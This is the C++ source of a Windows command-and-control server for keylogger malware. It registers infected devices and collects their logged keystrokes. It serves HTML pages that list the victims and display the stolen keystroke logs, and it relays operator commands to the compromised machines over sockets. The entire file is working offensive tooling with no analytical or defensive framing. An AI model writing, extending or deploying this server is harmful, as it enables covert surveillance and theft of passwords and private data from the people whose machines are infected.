#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <unordered_map>
#include <string>
#include <sstream>
#include <thread>
#include <mutex>
#include <condition_variable>
#include <vector>

#pragma comment(lib, "Ws2_32.lib")

using namespace std;

const int PORT = 8888;
unordered_map<string, SOCKET> infectedDevices;
unordered_map<string, string> keysLogged;
mutex mtx; // Mutex for synchronization

void sendCommand(const string& cmd) {
    stringstream commandStream(cmd);
    vector<string> commandSegments;
    string segment;

    while (getline(commandStream, segment, ' ')) {
        commandSegments.push_back(segment);
    }

    if (commandSegments.size() < 2 || commandSegments.size() > 3) {
        cerr << "Invalid command format." << endl;
        return;
    }
    string id = commandSegments[1];
    if (id.find("Device-") == string::npos){
        id = "Device-" + id;
    }
    auto it = infectedDevices.find(id);
    if (it == infectedDevices.end()) {
        cerr << "Device not found: " << id << endl;
        return;
    }

    SOCKET clientSocket = it->second;
    if (clientSocket != INVALID_SOCKET) {
        int sendResult = send(clientSocket, cmd.c_str(), static_cast<int>(cmd.size()), 0);
        if (sendResult == SOCKET_ERROR) {
            cerr << "Failed to send command to client. Error code: " << WSAGetLastError() << endl;
        } else {
            cout << "Sent command to " << id << ": " << cmd << endl;
        }
    } else {
        cerr << "Socket is invalid for device: " << id << endl;
    }
}

void checkforLogUpdates() {
    lock_guard<mutex> lock(mtx);
    for (const auto& pair : infectedDevices) {
        const string& deviceId = pair.first;
        SOCKET currentSocket = infectedDevices[deviceId];
        fd_set readFileSet;
        FD_ZERO(&readFileSet);
        FD_SET(currentSocket, &readFileSet);
        timeval timeout;
        timeout.tv_sec = 0;
        timeout.tv_usec = 0;
        int selectResult = select(0, &readFileSet, nullptr, nullptr, &timeout);
        if (selectResult == SOCKET_ERROR) {
            cerr << "Select failed.\n";
        } else if (selectResult > 0) {
            char buffer[4096];
            int bytesReceived = recv(currentSocket, buffer, sizeof(buffer), 0);
            if (bytesReceived == SOCKET_ERROR || bytesReceived == 0) {
                cerr << "Receive failed or connection closed.\n";
            } else {
                buffer[bytesReceived] = '\0';
                string newLog = buffer;
                keysLogged[deviceId] += newLog;
                cout << "Received log update from device " << deviceId << ": " << newLog << endl;
            }
        }
    }
}

void handle_request(SOCKET malwareSocket, const string& request) {
    lock_guard<mutex> lock(mtx);
    string commandInput;
    if (request.find("GET /clients/Device") != string::npos) {
        cout << "Handling device log request..." << endl;
        // Extract DeviceID from request
        string deviceId;
        size_t idPos = request.find("-");
        if (idPos != string::npos) {
            size_t idEndPos = request.find(" ", idPos);
            if (idEndPos == string::npos) {
                idEndPos = request.size();
            }
            deviceId = "Device-" + request.substr(idPos + 1, idEndPos - (idPos + 1));
        }

        stringstream htmlResponse;
        htmlResponse << "<html>"
                     << "<head><title>" << deviceId << "</title></head>"
                     << "<body>"
                     << "<h1>" << deviceId << "</h1>"
                     << keysLogged[deviceId]
                     << "</body>"
                     << "</html>";
        string response = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: " + to_string(htmlResponse.str().size()) + "\r\n\r\n" + htmlResponse.str();
        send(malwareSocket, response.c_str(), static_cast<int>(response.size()), 0);
        closesocket(malwareSocket);
    } else if (request.find("GET /clients") != string::npos) {
        cout << "Handling infected devices list request..." << endl;
        // Generate HTML for listing infected devices
        stringstream htmlResponse;
        htmlResponse << "<html>"
                     << "<head><title>Infected Devices</title></head>"
                     << "<body>"
                     << "<h1>Infected Devices</h1>";

        // Loop through infectedDevices and create links for each device ID
        for (const auto& pair : infectedDevices) {
            const string& deviceId = pair.first;
            htmlResponse << "<p><a href=\"/clients/" << deviceId << "\">" << deviceId << "</a></p>";
        }

        htmlResponse << "</body>"
                     << "</html>";

        string response = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: " + to_string(htmlResponse.str().size()) + "\r\n\r\n" + htmlResponse.str();
        send(malwareSocket, response.c_str(), static_cast<int>(response.size()), 0);
        closesocket(malwareSocket);
    } else if (request.find("GET /newClient") != string::npos) {
        cout << "Handling new client registration..." << endl;
        // Extract DeviceID from request
        string deviceId;
        size_t idPos = request.find("id=");
        cout<<"h"<<endl;
        if (idPos != string::npos) {
            size_t idEndPos = request.find(" ", idPos);
            if (idEndPos == string::npos) {
                idEndPos = request.size();
            }
            deviceId = request.substr(idPos + 3, idEndPos - (idPos + 3));
        } else {
            cerr << "Invalid client registration format." << endl;
            return;
        }

        // Add the device to infectedDevices map with deviceId as key and malwareSocket as value
        infectedDevices[deviceId] = malwareSocket;
        cout<<deviceId<<endl;
        string response = "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nconnected";
        //send(malwareSocket, response.c_str(), static_cast<int>(response.size()), 0);
    } else {
        cerr << "Unsupported request" << endl;
        string response = "HTTP/1.1 400 Bad Request\r\nContent-Type: text/html\r\n\r\n<h1>Bad Request: Unsupported Endpoint</h1>";
        //send(malwareSocket, response.c_str(), static_cast<int>(response.size()), 0);
        closesocket(malwareSocket);
    }
}

void socketThread() {
    WSADATA wsaData;
    SOCKET CandCSocket = INVALID_SOCKET;
    struct sockaddr_in CandCAddress, deviceAddress;
    int deviceAddressLength = sizeof(deviceAddress);

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        cerr << "WSAStartup failed.\n";
        return;
    }

    CandCSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (CandCSocket == INVALID_SOCKET) {
        cerr << "Socket creation failed.\n";
        WSACleanup();
        return;
    }

    CandCAddress.sin_family = AF_INET;
    CandCAddress.sin_addr.s_addr = INADDR_ANY;
    CandCAddress.sin_port = htons(PORT);
    if (bind(CandCSocket, (struct sockaddr*)&CandCAddress, sizeof(CandCAddress)) == SOCKET_ERROR) {
        cerr << "Bind failed.\n";
        closesocket(CandCSocket);
        WSACleanup();
        return;
    }

    if (listen(CandCSocket, SOMAXCONN) == SOCKET_ERROR) {
        cerr << "Listen failed.\n";
        closesocket(CandCSocket);
        WSACleanup();
        return;
    }

    cout << "Server started. Listening on port " << PORT << "...\n";

    while (true) {
        SOCKET malwareSocket = accept(CandCSocket, (struct sockaddr*)&deviceAddress, &deviceAddressLength);
        if (malwareSocket == INVALID_SOCKET) {
            cerr << "Accept failed.\n";
            closesocket(CandCSocket);
            WSACleanup();
            return;
        }

        char buffer[4096] = {0};
        int recvResult = recv(malwareSocket, buffer, sizeof(buffer), 0);
        if (recvResult == SOCKET_ERROR || recvResult == 0) {
            cerr << "Receive failed or connection closed.\n";
            closesocket(malwareSocket);
            continue;
        }

        // Handle the received request
        handle_request(malwareSocket, buffer);

    }

    closesocket(CandCSocket);
    WSACleanup();
}

void consoleInputThread() {
    while (true) {
        string commandInput;
        getline(cin, commandInput);

        // Process the command
        if (commandInput == "exit") {
            cout << "Exiting server..." << endl;
            break; // Exit the loop
        } else {
            sendCommand(commandInput);
        }
    }
}

int main() {
    thread socketThr(socketThread);
    thread consoleThr(consoleInputThread);

    // Join the threads to wait for them to finish
    socketThr.join();
    consoleThr.join();

    return 0;
}
